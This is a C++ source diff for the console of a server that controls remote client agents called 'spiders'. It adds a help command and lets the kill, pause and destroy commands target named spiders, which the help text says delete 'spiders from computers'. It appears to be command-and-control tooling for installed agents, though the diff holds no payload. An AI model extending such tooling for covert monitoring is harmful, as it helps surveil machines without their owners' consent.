@@ -8,6 +8,7 @@
 // Last update Wed Oct 21 09:01:22 2015 chapui_s
 //
 
+#include <boost/algorithm/string.hpp>
 #include <boost/algorithm/string/predicate.hpp>
 #include <boost/filesystem.hpp>
 #include <iostream>
@@ -27,6 +28,7 @@ Server::Server(uint16_t port)
 
   _commandsServer["list"] = [this]() -> int { return (_web->listSpider()); };
   _commandsServer["quit"] = [this]() -> int { _web->stop(); return (1); };
+  _commandsServer["help"] = [this]() -> int { return (help()); };
 }
 
 Server::~Server()
@@ -53,45 +55,63 @@ void		Server::stop()
   _web->stop();
 }
 
-void		Server::readCommand()
+int		Server::help()
 {
   std::cout << "Available commands:" << std::endl
-	    << "\tkill\t\t- Kill spiders" << std::endl
-	    << "\tpause\t\t- Pause spiders" << std::endl
-	    << "\tdestroy\t\t- Delete spiders from computers" << std::endl
-	    << "\tlist\t\t- List spiders connected" << std::endl
-	    << "\tquit\t\t- Quit server" << std::endl;
+	    << "\tkill [Spider1 ...]\t\t- Kill spiders" << std::endl
+	    << "\tpause [Spider1 ...]\t\t- Pause spiders" << std::endl
+	    << "\tdestroy [Spider1 ...]\t\t- Delete spiders from computers" << std::endl
+	    << "\tlist\t\t\t\t- List spiders connected" << std::endl
+	    << "\tquit\t\t\t\t- Quit server" << std::endl
+	    << "\thelp\t\t\t\t- Disp help" << std::endl;
+  return (0);
+}
+
+void		Server::readCommand()
+{
+  help();
   try {
+
     while (1) {
-      std::string	input;
+
       auto		prompt = [this]() -> int { std::cout << "> "; return (1); };
+      std::string	input;
+      std::list<std::string> strs;
 
       while (prompt() && std::getline(std::cin, input)) {
 
-	int		found = 0;
+	int	found = 0;
 
 	for (auto &command : _commandsSpider) {
 
+
 	  if (boost::starts_with(input, command.first)) {
-	    _web->sendCommand(command.second);
-	    found = 1;
-	  }
-	}
 
-	for (auto &command : _commandsServer) {
+	    boost::split(strs, input, boost::is_any_of("\t "), boost::token_compress_on);
+	    strs.pop_front();
 
-	  if (boost::equals(input, command.first)) {
-	    if (command.second()) {
-	      return ;
+	    if (!strs.size()) {
+	      _web->sendCommand(command.second);
+	    }
+	    else {
+	      _web->sendCommand(command.second, strs);
 	    }
 	    found = 1;
 	  }
 	}
 
+	for (auto &command : _commandsServer) {
+	  if (boost::equals(input, command.first)) {
+	    command.second();
+	    found = 1;
+	  }
+	}
 	if (!found) {
 	  std::cout << "Unknown command" << std::endl;
 	}
       }
+      std::cin.clear();
+      std::cout << std::endl;
     }
   }
   catch (const std::exception &e) {
